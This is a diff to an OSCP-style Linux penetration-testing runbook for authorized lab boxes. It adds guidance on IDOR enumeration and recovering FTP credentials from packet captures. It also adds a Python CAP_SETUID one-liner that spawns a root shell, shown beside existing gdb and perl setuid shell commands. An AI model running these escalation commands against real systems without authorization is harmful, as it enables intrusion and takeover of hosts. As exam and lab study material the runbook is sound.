@@ -114,6 +114,10 @@ If the source checks MIME and only the final extension, test an image/PHP polygl
 
 **Blocky pattern: slow API plus exposed application artifact:** if WordPress is identified and direct API requests are slow, measure the response with a longer curl timeout before blaming the VPN. If a plugin browser exposes a JAR, save it and route to [[OSCP/RUNBOOK V2/Linux - Binary Analysis|Linux - Binary Analysis]] and [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]]. The complete example is [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]].
 
+**Custom dashboard and capture branch:** if a web application exposes numeric records or downloadable captures, compare the smallest adjacent IDs and save the response metadata before expanding the range. Follow the download link, identify the artifact with file and capinfos, then use tshark filters for protocols present in the capture. Any cleartext credential belongs in private loot and should be validated once against the evidence-backed service, not sprayed. See [[OSCP/RUNBOOK V2/Linux - IDOR and PCAP Credential Recovery|Linux - IDOR and PCAP Credential Recovery]] and [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]].
+
+Live-service authentication and captured traffic are separate evidence sources. Anonymous FTP denial does not rule out an authenticated FTP session inside an application-exposed PCAP; route that artifact to the packet-analysis branch before discarding the lead.
+
 #### Step 3: Service-Specific Enumeration
 ```bash
 # SMB
@@ -550,6 +554,19 @@ gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ```
 
+#### Step 3c.1: Versioned interpreter with cap_setuid
+
+When getcap identifies CAP_SETUID on a scripting interpreter, use the exact capable path. A versioned binary may be the useful one even when the generic command name points elsewhere.
+
+~~~bash
+getcap /usr/bin/python3.8
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id
+whoami
+~~~
+
+The UID transition is the proof; CAP_SETUID does not necessarily change the group ID. If only an unrelated capability appears, continue with the other local branches. See [[OSCP/RUNBOOK V2/Linux - File Capabilities|Linux - File Capabilities]].
+
 #### Step 3d: Sudo Abuse (Module 18.4.2)
 
 ```bash
@@ -723,6 +740,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- demonstrates LFI, mechanical credential decoding, FreeBSD loopback enumeration, and SSH local forwarding
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- demonstrates WordPress plugin-aware enumeration, RFI verification, tar sudo abuse, systemd timer review, archive races, and architecture checks
 - [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- demonstrates slow-response timing, WordPress REST disclosure, and a web-to-SSH Java artifact path
+- [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- demonstrates dashboard IDOR, PCAP-based FTP credential recovery, evidence-backed SSH reuse, and Python CAP_SETUID escalation
 
 ## TartarSauce methodology note
 
@@ -741,6 +759,10 @@ The repeatable lesson is to follow the data and ownership transition, not just t
 Shocker demonstrates the full Linux fast path: validate the active target after a stale-address failure, save a complete port scan, route HTTP into CGI enumeration, prove Shellshock with id, catch and stabilise a Bash callback, then inspect sudo before considering slower privilege-escalation branches. The final boundary was an exact passwordless Perl rule, so the approved interpreter path and its arguments were preserved as evidence.
 
 See [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]], [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux - Shellshock CGI]], and [[OSCP/DECISION TREE/Web Applications (Decision Tree)|Web Applications decision tree]].
+
+## Management methodology note
+
+Management demonstrates the application-secret branch after a web foothold: identify the GLPI database and key, reproduce the documented secret format privately, validate the resulting account against SSH, and then read the complete sudo rule before selecting a parser or protocol abuse path. The rdiff-backup route is covered by [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]], [[OSCP/RUNBOOK V2/Linux - OpenAM JATO Deserialization|Linux - OpenAM JATO Deserialization]], and [[OSCP/RUNBOOK V2/Linux - Rdiff-Backup Sudo Abuse|Linux - Rdiff-Backup Sudo Abuse]].
 
 ## External Resources
 
